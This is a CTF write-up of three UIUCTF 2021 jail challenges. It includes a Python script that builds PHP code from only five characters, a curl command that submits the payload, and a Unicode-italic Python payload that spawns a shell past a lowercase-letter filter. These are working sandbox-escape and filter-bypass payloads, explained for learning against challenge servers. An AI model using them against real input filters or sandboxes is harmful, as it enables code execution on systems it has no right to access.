---
title: UIUCTF 2021 - Jails phpfuck, phpfuck_fixed, baby_python_fixed
author: sera
categories: other
layout: post
---

# phpfuck (jail? 50)
>  i hate php
>
> http://phpfuck.chal.uiuc.tf
>
> author: arxenix

We are given a link to a page with the comment `// Flag is inside ./flag.php :)`, and if we visit the page and check source the flag is literally there:
`<? /* uiuctf{pl3as3_n0_m0rE_pHpee} */ ?>`

This challenge is easy to make fun of, but it's actually an unintended solution and I can see why.

If you consult Google, the `<?` and `?>` tags are are supposed to start the PHP parser. This would prevent the flag from being echoed. However, these short tags are not enabled on the server, so the flag is just echoed out! The only tags you can rely on are `<?php ?>` and `<?= ?>`.

# phpfuck_fixed (jail 449)
> i really really hate php...
>
> http://phpfuck-fixed.chal.uiuc.tf
>
> HINT: Look, he has a monocle (^.9)
>
> author: arxenix


## Introduction
This challenge is not a joke unlike the baby version. We are given a page that will exec our code if and only if (there are no bypasses) the total number of unique characters is less than or equal to **5**. [PHPFuck](https://github.com/splitline/PHPFuck) is a real thing, but uses 7 different characters. We need to do it in 5.

Luckily, we have been giving the 5 characters in the form of a hint, and there characters are pretty much the most powerful characters anyway.

Our approach will be similar to most PHP jails - we can call functions with their name as a string, so something like `"file_get_contents"("flag.php")` will work. However, we need to find the primitives to construct any string first.

## Finding Primitives

The first primitive we need is to be able to make a string at all. We can use the `.` operator to force things into strings:

```
php > var_dump((9).(9));
string(2) "99"
```

We can also use the `^` operator to xor strings and numbers together:

```
php > var_dump(bin2hex(((9).(9))^((9^9).(9))));
string(4) "0900"
```
(This xors "99" with "09")

With some trial and error, we can find which characters we have avaliable to us:

- `0123456789` with digit operations like `99^9`
- `-` by getting an integer overflow, see `(9999999999999999999^9) -> -8446744073709551607`
- `I` by getting a float overflow, just stuff enough `9`s to get `INF`

Even though the `-` and `I` start at the first character, we can shift them over if neccessary.

As it turns out, this is a complete set over XOR - by xoring enough of these together, we can get **any** ASCII character in a character slot of the string! However, we have a big problem - the shortest string we can make with `.` is 2 characters, and we can't easily control the rest of the characters in the string. We need 1 character blocks.

An important property of `^` is it cuts strings to the shortest length. This means that our goal is to **create a length 1 string so we can make arbitrary characters and join them together**.

## Getting a single character

One way we could get a single character string to cut with is by concatenating a NULL.
```
php > var_dump((9).(NULL));
string(1) "9"
```

As it turns out, we can get a null by calling a function which takes more arguments than we pass. Is it possible to construct a function name with our 2 character blocks? It turns out that it is indeed barely possible.

After some manual enumeration and checking, I found we could construct the function name `link` using what we have. Constructing the string by hand is the most painful part of the challenge.

I constructed the paths to "li" and "nk" by hand and then wrote a helper script to brute force number xor conbinations that started with digits I wanted.

Here's the script to brute force the prefixes:
```php
<?php
$target = "-9";

$a = 0;
while($a < 9999999999999999999999999999999999) {
    $a += 9;
    $b = 0;
    while($b < 9999999999999999999999999999999999) {
        $b += 9;
        if(substr(strval($a^$b), 0, 2) == $target) {
            var_dump($a);
            var_dump($b);
            var_dump((integer)($a^$b));
            die();
        }
        $b *= 10;
    }
    $a *= 10;
}
```

Here is an overview of how I did it:

```
The first 2 xors are to cut the string.
`li` = "99" ^ "99" ^ "0-" ^ "-9" ^ "83" ^ "IN"
`li` = (((9).(9))^((9).(9))^((9^9).(9999999999999999999^9))^((999999999999999999999999999^99999999999999999999999999999).(9))^((999999999999999999999999999999^999999999999999999999).(9))^((9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9)))

`nk` = "99" ^ "99" ^ "-1" ^ "9-" ^ "39" ^ "IN"
`nk` = (((9).(9))^((9).(9))^((9999999999999999999^99999999999999999999999999999).(9))^((9).(9999999999999999999^9))^((999999999999999999999^99999999999999999999999).(9))^((9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9)))
```

Now that we have a way to generate a NULL, we can generate any single character.

## Putting it togther

All we need to do now is write a small wrapper that can put the characters together for us.The first thing we need is a mapping of a starting character `0123456789-I` to a string that contains it as the first character.

We can then insert it into a template using our `NULL` string to snag the first character: `"((" + r + ")^" + SINGLE_NULL + ")"`

Finally, we can just brute force the paths to get a target character from a combination of single character xors.

## Final script

```python
from pwn import xor
import itertools
from functools import lru_cache

chars = {
    b"1": "(999999999999999999999999)",
    b"I": "(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)",
    b"0": "(9^9)",
    b"-": "(9999999999999999999^9)",
    b"3": "(999999999999999999999^9)",
    b"2": "(999999999999999999999999^9)",
    b"5": "(999999999999999999999999999999^9)",
    b"9": "(9)",
    b"4": "(9999999999999999999999999999^9)",
    b"7": "(99999999999999999999999999999^9)",
    b"6": "(999999999999999999^99999999999999999999999999999)",
    b"8": "(99999999999999999999^9999999999999999999999)"
}

NULL_STR = "((((9).(9))^((9).(9))^((9^9).(9999999999999999999^9))^((999999999999999999999999999^99999999999999999999999999999).(9))^((999999999999999999999999999999^999999999999999999999).(9))^((9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))).(((9).(9))^((9).(9))^((9999999999999999999^99999999999999999999999999999).(9))^((9).(9999999999999999999^9))^((999999999999999999999^99999999999999999999999).(9))^((9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))))()"
SINGLE_Z = "(" + NULL_STR + ".(9^9))"
SINGLE_NULL = "(" + SINGLE_Z + "^" + SINGLE_Z + ")"

@lru_cache(maxsize=None)
def _generate(target):
    for i in range(2, len(chars)):
        for p in itertools.combinations(chars, i):
            s = xor(*p)
            if s == target:
                return p

def w(cs):
    return "(%s.(9))" % cs

def generate(target):
    g = _generate(target);
    print(g)
    r = "^".join(w(chars[p]) for p in g)
    return "((" + r + ")^" + SINGLE_NULL + ")"

def solve_for_str(target):
    res = [generate(c.encode()) for c in target]
    return ".".join(res)

# file_get_contents("flag.php")

f1 = solve_for_str("flag.php")
f2 = solve_for_str("file_get_contents")
assert(len(set(f1)) == 5)
assert(len(set(f2)) == 5)
with open("phpfuck.txt", "w") as f:
    f.write("x=")
    f.write("(" + f2+")("+f1+")")
```

```sh
> curl -X POST -d "@phpfuck.txt" http://phpfuck-fixed.chal.uiuc.tf/
<?php /* uiuctf{pl3as3_n0_m0rE_pHpee_9f4e3058} */ ?>
No flag for you!
```

# baby\_python\_fixed (jail 133)
> whoops, I made a typo on the other chal. it's probably impossible, right? Python version is 3.8.10 and flag is at /flag
>
> nc baby-python-fixed.chal.uiuc.tf 1337
>
> author: tow\_nater

## Introduction
This challenge is a very simple python jail which only checks that input does not contain any characters in the the `[a-z\s]` regular expression set. This blocks any lowercase characters and spaces.

I just wanted to do this short writeup to talk about why it works!

## Solution
As you'll see if you look at any writeups, python will accept italic unicode characters and treat them like normal ones, so we can use a payload just like `𝘹=__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(111)+𝘤𝘩𝘳(115));𝘹.𝘴𝘺𝘴𝘵𝘦𝘮(𝘤𝘩𝘳(115)+𝘤𝘩𝘳(104))`. This payload runs `x=import("os");os.system("sh")`.

`uiuctf{unicode_normalization_is_not_normal_d2f674}`

This might seem a bit crazy as the flag says, but this behaviour is actually clearly documented [here](https://docs.python.org/3/reference/lexical_analysis.html#identifiers).

Any identifiers are converted into unicode normal form NFKC during the parsing step. As stated on [Wikipedia](https://en.wikipedia.org/wiki/Unicode_equivalence), characters are normalized to canonical (meaningful) equivalence. The normalization allowing this bypass is a side effect of [PEP 3131](https://www.python.org/dev/peps/pep-3131/#rationale), which allows for unicode identifiers.

The PEP actually mentions that there is potential for abuse with these Unicode characters, and these were considered before the PEP was admitted. I couldn't find good documentation on why NFKC was chosen, but as mentioned [here](https://mail.python.org/pipermail/python-3000/2007-May/007995.html) this makes sense in a lot of semantic cases.

Personally I'm not sure if the PEP was a good idea but it's not as insane as it might seem at first, and you can't do shit like PHP...
